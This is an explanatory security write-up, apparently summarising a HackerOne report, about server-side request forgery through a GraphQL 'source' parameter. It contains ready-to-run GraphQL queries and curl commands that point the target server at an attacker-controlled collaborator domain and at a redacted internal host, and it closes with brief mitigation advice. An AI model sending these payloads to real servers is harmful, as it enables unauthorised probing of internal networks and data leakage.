---
description: 'Ref: https://hackerone.com/reports/1864188'
---

# 🤯 SSRF From Hackerone

**Understanding SSRF Vulnerabilities and Their Impact**

Server-Side Request Forgery (SSRF) is a critical security vulnerability that allows attackers to send unauthorized requests from the server to other internal or external resources. In this article, we will analyze some examples of SSRF queries and curl commands to better comprehend the severity of this issue.

#### SSRF Request with GraphQL Query Parameter

```json
query {
  allTicks(symbol:"TSLA", source:"https://[COLLABORATOR_DOMAIN]/") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xxx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://[COLLABORATOR_DOMAIN]/\"){ symbol server source ask time bid } }"}'
```

In this example, the GraphQL query contains a vulnerable parameter `source` that accepts a URL. An attacker can manipulate this URL to make the server send a request to their controlled domain, referred to as `[COLLABORATOR_DOMAIN]`, potentially leading to data leakage or unauthorized access.

#### SSRF Request with GET Parameters inside GraphQL JSON

```json
query {
  allTicks(symbol:"TSLA", source:"https://[COLLABORATOR_DOMAIN]/?do=something&") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://[COLLABORATOR_DOMAIN]//?do=something&\"){ symbol server source ask time bid } }"}'
```

Here, the GraphQL query includes GET parameters in the URL. An attacker can exploit this by modifying the parameters and potentially impacting the behavior of the server, leading to various security risks.

#### SSRF Request to Internal Host

```json
query {
  allTicks(symbol:"TSLA", source:"https://█████/?") {
    symbol
    server
    source
    ask
    time
    bid
  }
}
```

```bash
curl -v "https://xxxx.xxx.com/" -H "Content-Type: application/json" --data '{"query":"query { allTicks(symbol:\"TSLA\", source:\"https://https://████/?\"){ symbol server source ask time bid } }"}'
```

In this instance, the GraphQL query includes a modified URL with the placeholder `█████`, suggesting an attempt to perform an SSRF request to an internal host. If successful, this could expose sensitive information or services running on the internal network.

#### Conclusion

SSRF vulnerabilities are serious threats that require immediate attention from developers and security teams. To mitigate SSRF risks, it is essential to validate and sanitize user-provided URLs and limit access to sensitive internal resources.

Remember, proactive security measures and regular vulnerability assessments are crucial in maintaining a robust and secure web application. Stay vigilant, and always prioritize cybersecurity to protect both your users and your organization.

***
